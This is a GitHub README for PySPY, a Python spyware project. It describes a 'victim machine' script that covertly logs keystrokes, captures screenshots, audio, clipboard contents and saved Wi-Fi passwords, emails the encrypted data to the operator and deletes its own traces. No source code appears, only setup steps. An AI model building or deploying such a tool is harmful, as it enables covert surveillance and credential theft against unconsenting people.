<div id="top"></div>


<!-- PROJECT SHIELDS -->
<!--
-->
[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![GPL3 License][license-shield]][license-url]
[![LinkedIn][linkedin-shield]][linkedin-url]



<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a href="https://github.com/VENGENCE7/PySPY">
    <img src="images/logo.png" alt="Logo" width="80" height="80">
  </a>

<h3 align="center">PySPY</h3>

  <p align="center">
    Python Script for gathering information of a machine and mailing it to a desired email. Can be used as a payload.
    <br />
    <a href="https://github.com/VENGENCE7/PySPY"><strong>Explore the docs »</strong></a>
    <br />
    <br />
    <a href="https://github.com/VENGENCE7/PySPY">View Demo</a>
    ·
    <a href="https://github.com/VENGENCE7/PySPY/issues">Report Bug</a>
    ·
    <a href="https://github.com/VENGENCE7/PySPY/issues">Request Feature</a>
  </p>
</div>



<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#about-the-project">About The Project</a></li>
    <li><a href="#key-features">Key Features</a></li>        
    <li><a href="#python-modules-used">Python Modules Used</a></li>
        <ul>
            <li><a href="#need-installation">Need Installation</a></li>
            <li><a href="#built-in">Built-In</a></li>
            </ul>
    <li>
      <a href="#getting-started">Getting Started</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites</a></li>
        <li><a href="#installation">Installation</a></li>
      </ul>
    </li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
    <li><a href="#acknowledgments">Acknowledgments</a></li>
  </ol>
</details>



<!-- ABOUT THE PROJECT -->
## About The Project 
***NOTE - Not to be used to _harm others_ or for _malicious activities_***. <br /><br />
The PySPY project has two parts for two different works :
<br />
- __Victim Machine Script__
    - Runs on the target machine
    - Contains 9 functions and 1 main function
    - Collects System information, screenshots, audio, clipboard data & key-logs
    - Responsible for :
        - Gathering data
        - Encrypting data
        - Compressing data
        - Mailing data
        - Deleting data

- __User Machine Script__
    -  Runs on the user's machine
    -  One script created to assist the user with the results of Victm Machine script
    -  Help the user to do it all in console
    -  Created to assist the user for the following :
        - Key generation
        - Decryption of Data
        - Get zip information
        - Unzipping   
<br />

<p align="right">(<a href="#top">back to top</a>)</p>

<br />


<!-- KEY FEATURES -->
## Key Features 
* __Highly__ and __easily customizable__ according to the requirements
* __Additional Script__ for the user to __reduce his work__ after attack and __for key generation__ 
* __Encryption__ and __Compression__ of data 
* __Mailing__ to desired mail <br />
* __Threading__ used for better __efficiency__ and __quick execution__
* __Fast__ , Takes close to __26__ seconds to : 
    - Take _3 screenshots_ at 2sec interval each
    - _3sec_ of audio 
    - System information including :
        -  __saved-wifi passwords__
        -  __Mac address__
        -  __Ip address__
        -  __platform & Machine information__ 
    - _4 clipboard text_ at 2sec interval each _with timestamp_ and _doesnt copy if duplicate_ data present <br />
    - _Keylogs_ for 10s <br />
    - _Encrypt_ it all with key created by the user <br />
    - _Zip_ the data <br />
    - _Mail_ the zip to the desired mail 
    - _Clear tracks_ ,all files created are deleted

 <br />



<p align="right">(<a href="#top">back to top</a>)</p>

<!--Python Modules-->
## Python Modules used

<br />

### _Need Installation_
* [Cryptography](https://pypi.org/project/cryptography/)
* [Scipy](https://pypi.org/project/scipy/)
* [Sounddevice](https://pypi.org/project/sounddevice/)
* [Uuid](https://pypi.org/project/uuid/)
* [Pywin32](https://pypi.org/project/pywin32/)
* [Requests](https://pypi.org/project/requests/)
* [Pynput](https://pypi.org/project/pynput/)
* [Pillow](https://pypi.org/project/Pillow/)

<br />

### _Built-In_
- Threading
- Os
- Zipfile
- Time
- Platform
- Socket
- Subprocess
- Email
- Shutil


<p align="right">(<a href="#top">back to top</a>)</p>



<!-- GETTING STARTED -->
## Getting Started
__**NOTE : Only edit [ Main.py ] in victim machine unless you know what your doing**__ <br/>
;) Programs are filled with comments to explain whats goin on XD.

<br/>

Follow :

- Go through the _comments of main.py_ for understanding whats being done 
- All the places you need to change are mentioned with _+[EDIT and example for it]+_ in the code for ease 
- Make sure all the python _modules needed are installed_ from :[<a href="#need-installation">Install Modules</a>]
    - if missing refer <a href="#prerequisites">Prerequisites</a>
    
### Prerequisites
- [Python 3](https://www.python.org/downloads/)
+ Install required modules from the Requirements.txt file present in respective script <br />
```sh
pip install -r /path/to/requirements.txt
```
+ If any module is missing check with: (<a href="#need-installation">Install Modules</a>) and use
```sh
pip install <module_name>
```
+ Setup E-mail for for sending mail
  Refer below for seting up E-mail account so that the Script can access it
    * Turning on 'less secure apps' settings as mailbox user
        * Go to your (Google Account).
        * On the left navigation panel, click Security.
        *  On the bottom of the page, in the Less secure app access panel, click Turn on access.
        * If you don't see this setting, your administrator might have turned off less secure app account access (check the instruction above).
        * Click the Save button.
        
### Installation

1. Clone the repo
   ```sh
   git clone https://github.com/VENGENCE7/PySPY.git
   ```
2. Check if required modules present using and check with [<a href="#need-installation">Modules</a>] : 
   ```sh
   pip freeze
   ```

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- USAGE EXAMPLES -->
## Usage

### Victim Machine Script
    + Make sure the path in main.py is correct
<p align="right">(<a href="#top">back to top</a>)</p>


<!-- CONTRIBUTING -->
## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- LICENSE -->
## License

Distributed under the  License. See `LICENSE.txt` for more information.

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- CONTACT -->
## Contact

__**Bhavish Anand**__ :- bhavish007anand@gmail.com

__**Project Link:**__ :- [PySPY](https://github.com/VENGENCE7/PySPY)

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [**Grant Collins**-For basic understanding of concept](https://www.youtube.com/watch?v=25um032xgrw&t=1946s)
* [**Tech with Tim**-For better understanding of a key-logger](https://www.youtube.com/c/TechWithTim)
* [**Stack Overflow**-For Solving all my queries regarding _threading_ ](https://stackoverflow.com/)
* [**Iampython**-For implementinf cryptography module for encryption](https://www.youtube.com/watch?v=bE7fl6qN-LY&t=511s)

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[contributors-shield]: https://img.shields.io/github/contributors/VENGENCE7/PySPY.svg?style=for-the-badge
[contributors-url]: https://github.com/VENGENCE7/PySPY/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/VENGENCE7/PySPY.svg?style=for-the-badge
[forks-url]: https://github.com/VENGENCE7/PySPY/network/members
[stars-shield]: https://img.shields.io/github/stars/VENGENCE7/PySPY.svg?style=for-the-badge
[stars-url]: https://github.com/VENGENCE7/PySPY/stargazers
[issues-shield]: https://img.shields.io/github/issues/VENGENCE7/PySPY.svg?style=for-the-badge
[issues-url]: https://github.com/VENGENCE7/PySPY/issues
[license-shield]: https://img.shields.io/github/license/VENGENCE7/PySPY.svg?style=for-the-badge
[license-url]: https://github.com/VENGENCE7/PySPY/blob/master/LICENSE.txt
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://linkedin.com/in/bhavish-anand-2113a6206
[ScreenShot]:![t1](https://user-images.githubusercontent.com/86911386/157885521-57a99d09-6409-4870-bf14-7d3591241758.png)
